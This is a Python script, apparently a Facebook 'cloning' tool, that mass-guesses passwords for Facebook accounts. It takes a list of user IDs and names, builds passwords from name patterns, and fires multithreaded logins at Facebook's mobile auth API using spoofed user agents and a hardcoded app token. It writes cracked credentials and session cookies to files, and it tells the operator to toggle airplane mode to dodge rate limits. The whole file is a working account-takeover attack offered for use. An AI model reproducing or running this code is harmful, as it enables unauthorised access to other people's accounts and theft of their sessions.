#coding = utf-8
#This Open-Source Script is Written by UZARR
#Please Donot Forget to give Credit 
#Whatsapp : +923408464015
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd


try:
	import requests
except ImportError:
	os.system('pip install requests')


ses = requests.Session()

id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []


##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
#________________________________________#
def clear():
	os.system("clear")

def line():
	print(52*'-')
def p(x):
	print(x)

def logo():
	logo = (f'''\033[1;97m                                    
\033[1;31m $$\   $$\ $$$$$$$$\  $$$$$$\  $$$$$$\ $$$$$$$\  
\033[1;32m $$ |  $$ |\____$$  |$$  __$$\ \_$$  _|$$  __$$\ 
\033[1;33m $$ |  $$ |    $$  / $$ /  $$ |  $$ |  $$ |  $$ |
\033[1;34m $$ |  $$ |   $$  /  $$$$$$$$ |  $$ |  $$$$$$$  |
\033[1;35m $$ |  $$ |  $$  /   $$  __$$ |  $$ |  $$  __$$< 
\033[1;37m $$ |  $$ | $$  /    $$ |  $$ |  $$ |  $$ |  $$ |
  $$$$$$  |$$$$$$$$\ $$ |  $$ |$$$$$$\ $$ |  $$ |
 \______/ \________|\__|  \__|\______|\__|  \__|
 
[<>] Welcome To  UZAIR SHAH Tool
---------------------------------------------------
 [•]➣ Author    : Uzair shah
 [•]➣ Github    : Uzair-72
 [•]➣ Facebook  : Uzair Shah
 [•]➣ Version   : 0.1
---------------------------------------------------''')
	p(logo)


ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "



ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'

# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Mozilla/5.0 (Linux; Mozilla/5.0 (Linux; Android 11; TECNO BD1 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36Android 12; RMX3115 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; RMX3115) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3115 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; RMX3363 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.51 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; RMX3311) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; RMX3311 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3311 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; RMX3710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; TECNO AX8 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; TECNO AB7 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.1; Tecno A3800) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO AD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0; TECNO PhonePad 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; TECNO BA2 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.0.2; TECNO-C5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; TECNO BB4 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.60 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; TECNO BB4 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; TECNO BD1 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36;]",])+END
	return ua

	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce Coded by Uzair ID ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join  Facebook Group ")
		p(' [3] Join  Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://www.facebook.com/angelkate.lee.165/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp')
		else:
			p(' [•] Wrong Select Hai Uzair ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1 ')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Uzair shah ')
			sp(1)
			self.methods_menu()

	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()

	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•]  Cloning Has Been Started ')
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight ( Jahaz ) Mode Before / During Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [UZAIR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/UZAIR_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/UZAIR_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[UZAIR-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/UZAIR_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)

	def method2(self,uid,nm,pwx):
		#YE METHOD 2 HE
		print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
		exit()

	def method3(self,uid,nm,pwx):
		#YE METHOD 3 HE
		print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
		exit()

		exit()
if __name__=="__main__":
	Main().menu()